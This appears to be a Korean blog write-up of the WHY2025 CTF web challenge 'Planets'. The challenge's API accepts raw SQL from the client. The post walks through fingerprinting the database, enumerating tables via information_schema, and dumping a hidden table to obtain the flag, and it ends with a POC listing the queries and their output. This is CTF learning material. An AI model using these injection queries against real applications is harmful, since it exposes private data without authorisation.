---
layout: post
title: "[CTF] WHY2025 : PLANETS"
date: 2025-08-10 16:03 +0900
category: Write-Up
tag: [CTF, WHY2025CTF, web]
---
### **INFO**
![chall]
_Fig 1. Challenge_

### **RECON**
행성들의 사진과 설명을 보여주는 사이트가 주어진다.

정적 페이지로 버튼이나 폼 같은 요소들이 보이지 않아서, 소스코드를 분석하였다.
`<script>...<script>` 에 서버와 통신하는 api가 정의되어 있다. 이때 SQL문이 쿼리값으로 넘어가는 것을 확인할 수 있다.
``` js
<script>
        try {
            fetch("/api.php", {
                method: "POST",
                body: "query=SELECT * FROM planets",    // 취약한 부분
                headers: {"Content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
            })
            .then(response => response.json())
            .then(response => addPlanets(response))
        } catch (error) {
            console.error(error.message);
        }
        
	function addPlanets(planets){

            let container  = document.getElementById("container");
            for (planet in planets){
                let div = document.createElement("div");
                div.classList = "planet";
    
                let h2 = document.createElement("h2");
                h2.textContent = planets[planet].name;
    
                let img = document.createElement("img");
                img.src = "images/" + planets[planet].image;
                img.alt = planets[planet].name;
    
                let p = document.createElement("p");
                p.textContent = planets[planet].description;
    
                div.appendChild(h2);
                div.appendChild(img);
                div.appendChild(p);
                container.appendChild(div);
            }
	}
</script> 
```

이를 burp suite로 네트워크 패킷을 캡처하여 보면 req/res는 Fig 2와 같다. SQL 구문 변조를 통해 원하는 값을 출력할 수 있다는 것을 알 수 있다.

![recon_1]
_Fig 2. POST /api.php_

### **SOLUTION**
취약한 API를 통해 플래그를 획득하는 과정을 순서대로 설명한다.

먼저 어떤 DB를 사용하고 있는지 알기 위해 [PentestMonkey cheat sheets](https://pentestmonkey.net/category/cheat-sheet/sql-injection)를 참고하여 DB 종류를 식별했다.

DB 식별을 위해 사용한 SQL문은 다음과 같다.

| DBMS            | 버전 확인 쿼리                   | 예시 출력                                   | 
|-----------------|--------------------------------|--------------------------------------------|
| MySQL           | `SELECT @@version;`            | {DB_VERSION}-{BUILD_INFO}                  |
| PostgreSQL      | `SELECT version();`            | PostgreSQL {DB_VERSION} on {BUILD_INFO}... |
| Oracle          | `SELECT * FROM v$version;`     | Oracle Database {DB_VERSION} ...           |
| SQLite          | `SELECT sqlite_version();`     | 3.46.0                                     |

캡쳐한 네트워크 패킷(Fig 2)을 repeater에 넣고 재전송을 시도하다보면, MySQL을 사용했다는 것을 알 수 있다.

그 다음 순서는 의심가는 테이블을 식별하고, 데이터를 출력하여 플래그를 획득하는 것이다.
MySQL의 information_schema.tables에서 테이블에 대한 정보를 볼 수 있다. 

개인적으로 abandoned_planets 테이블이 가장 의심스러웠다.

이 테이블의 데이터를 출력해보면, 플래그를 확인 할 수 있다.
![solution_result]
_Fig 3. Get Flag!_

### **POC**
/api.php에 POST를 하면서 사용한 SQL 쿼리를 정리했다.

```sql
/*** 0. SQL 식별 ***/
SELECT @@version;

/*** 1. 테이블 출력 ***/
SELECT table_schema,table_name 
FROM information_schema.tables 
WHERE table_schema != 'mysql'
AND table_schema != 'information_schema';
/* 출력: 
    [ ... , 
        {"TABLE_SCHEMA": "performance_schema", "TABLE_NAME": "variables_info"},
        {"TABLE_SCHEMA": "planets", "TABLE_NAME": "abandoned_planets"},
        {"TABLE_SCHEMA": "planets", "TABLE_NAME": "planets"}
    ]
*/

/*** 2. abandoned_planets의 열 출력 ***/
SELECT * FROM abandoned_planets;
/* 출력:
    [
        {
            "id": 1,
            "name": "Pluto",
            "image": "pluto.png",
            "description": "Have you heard about Pluto? That's messed up right? flag{...}"
        }
    ]
*/

```
[chall]: /assets/CTF/WHY2025/planets/challenge.png
[recon_1]: /assets/CTF/WHY2025/planets/recon_1.png
[solution_result]: /assets/CTF/WHY2025/planets/solution_result.png